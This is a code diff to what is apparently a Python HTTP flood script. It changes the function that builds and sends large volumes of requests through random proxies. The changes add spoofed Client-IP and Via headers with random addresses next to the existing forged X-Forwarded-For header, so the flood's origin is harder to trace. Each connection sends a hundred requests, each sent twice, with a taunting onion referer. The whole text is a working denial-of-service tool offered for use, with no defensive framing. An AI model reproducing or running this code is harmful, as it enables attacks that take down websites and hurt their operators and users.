@@ -128,13 +128,15 @@ def GenUA():
 def flood():
     proxy = random.choice(proxies).strip().split(":")
     proto = "X-Forwarded-Proto: Http\r\n"
-    x_host = "X-Forwarded-Host: "+host+"\r\n"
-    verHost = " HTTP/1.1\r\nHost: "+host+"\r\n"
-    useragent = random.choice(useragents)+"\r\n"
+    x_host = "X-Forwarded-Host: " + host + "\r\n"
+    via = "Via: " + ranip() + "\r\n"
+    client_ip = "Client-IP: " + ranip() + "\r\n"
+    verHost = " HTTP/1.1\r\nHost: " + host + "\r\n"
+    useragent = useragents[x] + "\r\n"
     connection = "Connection: Keep-Alive:314\r\n"
     accept = "Accept: */*\r\n"
     referer = "Referer: http://Fr33-Th3-C0d3-0f-N3ts3c-R380rn.onion/Noro-virus?id="+host+"\r\n"     
-    fake_addr = "X-Forwarded-For: "+ranip()+", "+proxy[0]+", 1.1.1.1\r\n"
+    fake_addr = "X-Forwarded-For: " + ranip() + ", " + proxy[0] + ", 1.1.1.1\r\n"
     content = "\r"
     length = "\n"
     if attack_type =="POST":
@@ -159,9 +161,9 @@ def flood():
                     s.send(str(sslrequest).encode())
                 for _ in range(100):
                     http = attack_type + " " + url + "?" + str(random.choice(string)) + "=" + str(random.randint(1,65535))
-                    request = http + verHost + x_host + connection + accept + useragent + referer + fake_addr + content + length
+                    request = http + verHost + x_host + connection + accept + useragent + referer + fake_addr + client_ip + via + content + length
                     if brute == True:
-                        request = http + verHost + connection + fake_addr + content + length
+                        request = http + verHost + connection + fake_addr + client_ip + via + content + length
                     s.send(str(request).encode())
                     s.send(str(request).encode())
                 s.close()
